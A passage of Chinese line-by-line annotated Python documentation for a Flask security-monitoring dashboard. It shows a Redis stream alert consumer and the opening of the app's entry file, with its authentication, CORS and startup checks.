| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from flask import Flask` |
| 11 | 导入对象：从指定模块引入类、函数或常量。 | `from flask_socketio import SocketIO` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 导入对象：从指定模块引入类、函数或常量。 | `from src.utils.redis_client import RedisClient` |
| 14 | 导入对象：从指定模块引入类、函数或常量。 | `from web.database import db` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 类定义：声明 `GuardianAlertStreamConsumer`，封装相关状态与行为。 | `class GuardianAlertStreamConsumer:` |
| 20 | 文档字符串：说明当前模块、类或函数的职责。 | `    """后台线程：consumer group 读流、失败留在 PEL 可重试、\`\`XAUTOCLAIM\`\` 回收滞留。"""` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 24 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        app: Flask,` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        redis_client: RedisClient,` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        socketio: SocketIO,` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream_key: str,` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        group_name: str,` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        consumer_name: Optional[str] = None,` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        read_count: int = 20,` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        idle_block_ms: int = 1500,` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        autoclaim_idle_ms: int = 120_000,` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        autoclaim_interval_sec: float = 30.0,` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        normalizer: Optional[Callable[[Dict[str, Any]], Optional[Dict[str, Any]]]] = None,` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        upsert_alert: Optional[Callable[[Dict[str, Any]], Any]] = None,` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_to_api_dict: Optional[Callable[[Any], Dict[str, Any]]] = None,` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 39 | 条件判断：满足条件时进入对应分支。 | `        if normalizer is None or upsert_alert is None or alert_to_api_dict is None:` |
| 40 | 导入对象：从指定模块引入类、函数或常量。 | `            from web.app import (  # Local import avoids a startup circular import.` |
| 41 | 代码语句：参与当前文件的业务流程或数据处理。 | `                _alert_to_api_dict,` |
| 42 | 代码语句：参与当前文件的业务流程或数据处理。 | `                _upsert_alert_to_db,` |
| 43 | 代码语句：参与当前文件的业务流程或数据处理。 | `                normalize_guardian_stream_fields,` |
| 44 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            normalizer = normalizer or normalize_guardian_stream_fields` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            upsert_alert = upsert_alert or _upsert_alert_to_db` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            alert_to_api_dict = alert_to_api_dict or _alert_to_api_dict` |
| 49 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._app = app` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._redis = redis_client` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._socketio = socketio` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._normalizer = normalizer` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._upsert_alert = upsert_alert` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._alert_to_api_dict = alert_to_api_dict` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._stream = stream_key` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._group = group_name` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._consumer = consumer_name or f"web-{os.getpid()}"` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._read_count = read_count` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._idle_block_ms = idle_block_ms` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._autoclaim_idle_ms = autoclaim_idle_ms` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._autoclaim_interval = autoclaim_interval_sec` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._stop = threading.Event()` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._thread: Optional[threading.Thread] = None` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_autoclaim = 0.0` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 函数定义：声明 `start` 的输入、处理逻辑和返回结果。 | `    def start(self) -> None:` |
| 68 | 条件判断：满足条件时进入对应分支。 | `        if self._thread is not None and self._thread.is_alive():` |
| 69 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 70 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._stop.clear()` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._thread = threading.Thread(` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            target=self._run_loop,` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            name="GuardianAlertStreamConsumer",` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            daemon=True,` |
| 75 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 76 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._thread.start()` |
| 77 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 78 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[AlertConsumer] started stream=%s group=%s consumer=%s redis_mode=%s",` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._stream,` |
| 80 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._group,` |
| 81 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._consumer,` |
| 82 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._redis.mode,` |
| 83 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 84 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 85 | 函数定义：声明 `stop` 的输入、处理逻辑和返回结果。 | `    def stop(self, timeout: float = 8.0) -> None:` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._stop.set()` |
| 87 | 条件判断：满足条件时进入对应分支。 | `        if self._thread is not None:` |
| 88 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._thread.join(timeout=timeout)` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._thread = None` |
| 90 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[AlertConsumer] stopped")` |
| 91 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 92 | 函数定义：声明 `_run_loop` 的输入、处理逻辑和返回结果。 | `    def _run_loop(self) -> None:` |
| 93 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 94 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._redis.stream_ensure_group(self._stream, self._group)` |
| 95 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 96 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[AlertConsumer] ensure_group failed: %s", exc)` |
| 97 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 98 | 循环：在条件成立期间重复执行逻辑。 | `        while not self._stop.is_set():` |
| 99 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                batch: List[Tuple[str, Dict[str, Any]]] = []` |
| 101 | 函数调用：执行已有函数/方法完成当前步骤。 | `                batch.extend(` |
| 102 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._redis.stream_read_own_pending(` |
| 103 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        self._stream,` |
| 104 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        self._group,` |
| 105 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        self._consumer,` |
| 106 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        self._read_count,` |
| 107 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 108 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                now = time.monotonic()` |
| 110 | 条件判断：满足条件时进入对应分支。 | `                if now - self._last_autoclaim >= self._autoclaim_interval:` |
| 111 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    batch.extend(` |
| 112 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        self._redis.stream_autoclaim(` |
| 113 | 代码语句：参与当前文件的业务流程或数据处理。 | `                            self._stream,` |
| 114 | 代码语句：参与当前文件的业务流程或数据处理。 | `                            self._group,` |
| 115 | 代码语句：参与当前文件的业务流程或数据处理。 | `                            self._consumer,` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            min_idle_ms=self._autoclaim_idle_ms,` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            start="0-0",` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            count=self._read_count,` |
| 119 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        )` |
| 120 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    self._last_autoclaim = now` |
| 122 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 123 | 条件判断：满足条件时进入对应分支。 | `                if not batch:` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    block = max(100, min(self._idle_block_ms, 3000))` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    batch = self._redis.stream_read_group(` |
| 126 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        self._stream,` |
| 127 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        self._group,` |
| 128 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        self._consumer,` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        count=self._read_count,` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        block_ms=block if self._redis.is_available else 50,` |
| 131 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 132 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 133 | 条件判断：满足条件时进入对应分支。 | `                if not batch:` |
| 134 | 条件判断：满足条件时进入对应分支。 | `                    if not self._redis.is_available:` |
| 135 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        time.sleep(0.25)` |
| 136 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 137 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 138 | 循环：逐个处理集合或迭代器中的元素。 | `                for msg_id, fields in batch:` |
| 139 | 条件判断：满足条件时进入对应分支。 | `                    if self._stop.is_set():` |
| 140 | 跳出循环：提前结束当前循环。 | `                        break` |
| 141 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._process_one(msg_id, fields)` |
| 142 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception:  # noqa: BLE001` |
| 143 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.exception("[AlertConsumer] loop error")` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `                time.sleep(1.0)` |
| 145 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 146 | 函数定义：声明 `_process_one` 的输入、处理逻辑和返回结果。 | `    def _process_one(self, msg_id: str, fields: Dict[str, Any]) -> None:` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        norm = self._normalizer(fields)` |
| 148 | 条件判断：满足条件时进入对应分支。 | `        if norm is None:` |
| 149 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning(` |
| 150 | 函数调用：执行已有函数/方法完成当前步骤。 | `                "[AlertConsumer] skip malformed entry (no alert_id), acking %s", msg_id` |
| 151 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 152 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._redis.stream_ack(self._stream, self._group, [msg_id])` |
| 153 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 154 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ack = False` |
| 156 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 157 | 上下文管理：自动管理资源打开与释放。 | `            with self._app.app_context():` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                row = self._upsert_alert(norm)` |
| 159 | 条件判断：满足条件时进入对应分支。 | `                if row is None:` |
| 160 | 日志记录：输出运行状态、调试信息或异常线索。 | `                    logger.error("[AlertConsumer] upsert returned None for %s", msg_id)` |
| 161 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    api_dict = self._alert_to_api_dict(row)` |
| 163 | 异常保护：尝试执行可能失败的逻辑。 | `                    try:` |
| 164 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        self._socketio.emit("alert", api_dict)` |
| 165 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                    except Exception:  # noqa: BLE001` |
| 166 | 日志记录：输出运行状态、调试信息或异常线索。 | `                        logger.debug("[AlertConsumer] socket emit failed", exc_info=True)` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    state = self._app.extensions.get("guardian_state")` |
| 168 | 条件判断：满足条件时进入对应分支。 | `                    if state is not None:` |
| 169 | 异常保护：尝试执行可能失败的逻辑。 | `                        try:` |
| 170 | 函数调用：执行已有函数/方法完成当前步骤。 | `                            state.add_alert(api_dict)` |
| 171 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                        except Exception:  # noqa: BLE001` |
| 172 | 日志记录：输出运行状态、调试信息或异常线索。 | `                            logger.debug(` |
| 173 | 代码语句：参与当前文件的业务流程或数据处理。 | `                                "[AlertConsumer] memory cache sync failed", exc_info=True` |
| 174 | 函数调用：执行已有函数/方法完成当前步骤。 | `                            )` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    ack = True` |
| 176 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:  # noqa: BLE001` |
| 177 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.exception(` |
| 178 | 函数调用：执行已有函数/方法完成当前步骤。 | `                "[AlertConsumer] persist failed msg_id=%s (not ack; will retry)", msg_id` |
| 179 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 180 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 181 | 函数调用：执行已有函数/方法完成当前步骤。 | `                db.session.rollback()` |
| 182 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception:  # noqa: BLE001` |
| 183 | 占位语句：保持语法完整但当前不执行操作。 | `                pass` |
| 184 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 185 | 条件判断：满足条件时进入对应分支。 | `        if ack:` |
| 186 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._redis.stream_ack(self._stream, self._group, [msg_id])` |

## `web/app.py`

- 类型：路由与 API
- 行数：3924

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""Flask Web 应用入口（Phase 7 可视化与交互层）。` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §8（可视化与交互层）、§9（数据流与通信机制）、§10（技术选型）。` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `遵循：` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - AI-Security-Guardian-DESIGN.md：视觉与交互规范` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - AI-Security-Guardian-Cursor-Phase7-Frontend-Prompt.md：实施约束` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 开发实操指南修复版 Phase 7：**仅保留**安全与通信基线，UI 由 DESIGN 覆盖` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `安全与通信基线（硬要求）：` |
| 10 | 函数调用：执行已有函数/方法完成当前步骤。 | `    1. SECRET_KEY / JWT_SECRET_KEY 从 \`config.get_config()\` 读取（环境变量驱动）` |
| 11 | 函数调用：执行已有函数/方法完成当前步骤。 | `    2. 所有 \`/api/*\` 默认加 \`@jwt_required()\`；仅 \`/api/auth/login\`、\`/api/health\`、` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `       \`/healthz\`、\`/readyz\`、\`/metrics\` 匿名` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    3. CORS 仅允许 \`config.ALLOWED_ORIGINS\` 白名单，禁止 \`*\`` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    4. Flask-Limiter：默认 \`config.API_RATE_LIMIT\`，登录接口额外 \`5 per minute\`` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    5. Flask-SocketIO：\`cors_allowed_origins\` 与 REST 使用同一白名单` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    6. IP 入参复用 \`src.response.responder.validate_ip\`，非法一律拒绝` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    7. 401 / 403 / 429 返回 JSON 错误体，前端统一拦截` |
| 18 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 19 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import atexit` |
| 22 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 23 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 24 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 25 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import random` |
| 26 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import re` |
| 27 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 28 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import uuid` |
| 29 | 导入对象：从指定模块引入类、函数或常量。 | `from collections import deque` |
| 30 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timedelta, timezone` |
| 31 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Deque, Dict, Iterable, List, Optional, Tuple` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 导入对象：从指定模块引入类、函数或常量。 | `from flask import Flask, jsonify, redirect, render_template, request, url_for` |
| 34 | 导入对象：从指定模块引入类、函数或常量。 | `from flask_cors import CORS` |
| 35 | 导入对象：从指定模块引入类、函数或常量。 | `from flask_jwt_extended import (` |
| 36 | 代码语句：参与当前文件的业务流程或数据处理。 | `    JWTManager,` |
| 37 | 代码语句：参与当前文件的业务流程或数据处理。 | `    create_access_token,` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `    create_refresh_token,` |
| 39 | 代码语句：参与当前文件的业务流程或数据处理。 | `    get_jwt_identity,` |
| 40 | 代码语句：参与当前文件的业务流程或数据处理。 | `    jwt_required,` |
| 41 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 42 | 导入对象：从指定模块引入类、函数或常量。 | `from flask_limiter import Limiter` |
| 43 | 导入对象：从指定模块引入类、函数或常量。 | `from flask_limiter.util import get_remote_address` |
| 44 | 导入对象：从指定模块引入类、函数或常量。 | `from flask_socketio import SocketIO, disconnect` |
| 45 | 导入对象：从指定模块引入类、函数或常量。 | `from sqlalchemy import func, or_` |
| 46 | 导入对象：从指定模块引入类、函数或常量。 | `from sqlalchemy.exc import IntegrityError` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 注释：解释下面或当前这段代码的设计意图。 | `# Ensure project root is importable for script-style startup (\`python web/app.py\`).` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))` |
| 50 | 条件判断：满足条件时进入对应分支。 | `if _PROJECT_ROOT not in sys.path:` |
| 51 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, _PROJECT_ROOT)` |
| 52 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 53 | 导入对象：从指定模块引入类、函数或常量。 | `from config.config import get_config` |
| 54 | 导入对象：从指定模块引入类、函数或常量。 | `from src.collectors.threat_intel import ThreatIntelCollector` |
| 55 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.responder import validate_ip` |
| 56 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.webhook_url import check_webhook_url_safe` |
| 57 | 导入对象：从指定模块引入类、函数或常量。 | `from src.utils.auth import verify_admin_credentials` |
| 58 | 导入对象：从指定模块引入类、函数或常量。 | `from web.database import db, init_db_tables` |
| 59 | 导入对象：从指定模块引入类、函数或常量。 | `from web import models as _db_models  # noqa: F401` |
| 60 | 导入对象：从指定模块引入类、函数或常量。 | `from web.models import (` |
| 61 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Alert,` |
| 62 | 代码语句：参与当前文件的业务流程或数据处理。 | `    AlertHistory,` |
| 63 | 代码语句：参与当前文件的业务流程或数据处理。 | `    BannedIp,` |
| 64 | 代码语句：参与当前文件的业务流程或数据处理。 | `    IOC,` |
| 65 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ModelVersion,` |
| 66 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ResponseAction,` |
| 67 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Rule,` |
| 68 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Setting,` |
| 69 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 70 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 71 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 72 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_REQUIRED_MODEL_FILES: Tuple[str, ...] = (` |
| 74 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "intrusion_rf_v1.pkl",` |
| 75 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "ddos_rf_v1.pkl",` |
| 76 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "web_attack_nb_v1.pkl",` |
| 77 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "anomaly_if_v1.pkl",` |
| 78 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 79 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 80 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 81 | 函数定义：声明 `_resolve_model_dir` 的输入、处理逻辑和返回结果。 | `def _resolve_model_dir(app: Flask) -> str:` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_dir = str(app.config.get("MODEL_DIR", "models/saved"))` |
| 83 | 条件判断：满足条件时进入对应分支。 | `    if os.path.isabs(model_dir):` |
| 84 | 返回结果：把处理后的值交回调用方。 | `        return model_dir` |
| 85 | 返回结果：把处理后的值交回调用方。 | `    return os.path.abspath(os.path.join(app.root_path, "..", model_dir))` |
| 86 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 87 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 88 | 函数定义：声明 `_missing_model_artifacts` 的输入、处理逻辑和返回结果。 | `def _missing_model_artifacts(app: Flask) -> List[str]:` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    md = _resolve_model_dir(app)` |
| 90 | 返回结果：把处理后的值交回调用方。 | `    return [f for f in _REQUIRED_MODEL_FILES if not os.path.exists(os.path.join(md, f))]` |
| 91 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 函数定义：声明 `_runtime_dependency_checks` 的输入、处理逻辑和返回结果。 | `def _runtime_dependency_checks(app: Flask, cfg: Any) -> Dict[str, Any]:` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    checks: Dict[str, Any] = {}` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    require_redis = bool(getattr(cfg, "REQUIRE_REDIS_AVAILABLE", False))` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    require_models = bool(getattr(cfg, "REQUIRE_MODELS_READY", False))` |
| 97 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 98 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.utils.redis_client import RedisClient` |
| 99 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    redis_client = RedisClient(` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        host=cfg.REDIS_HOST,` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        port=cfg.REDIS_PORT,` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        db=cfg.REDIS_DB,` |
| 104 | 占位语句：保持语法完整但当前不执行操作。 | `        password=getattr(cfg, "REDIS_PASSWORD", "") or "",` |
| 105 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    redis_ok = bool(redis_client.ping())` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    checks["redis"] = {` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ok": redis_ok,` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "mode": redis_client.mode,` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "required": require_redis,` |
| 111 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 112 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    missing = _missing_model_artifacts(app)` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    checks["models"] = {` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ok": len(missing) == 0,` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "required": require_models,` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "missing": missing,` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_dir": _resolve_model_dir(app),` |
| 119 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 120 | 返回结果：把处理后的值交回调用方。 | `    return checks` |
| 121 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 122 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 123 | 函数定义：声明 `_enforce_startup_guards` 的输入、处理逻辑和返回结果。 | `def _enforce_startup_guards(app: Flask, cfg: Any) -> Dict[str, Any]:` |
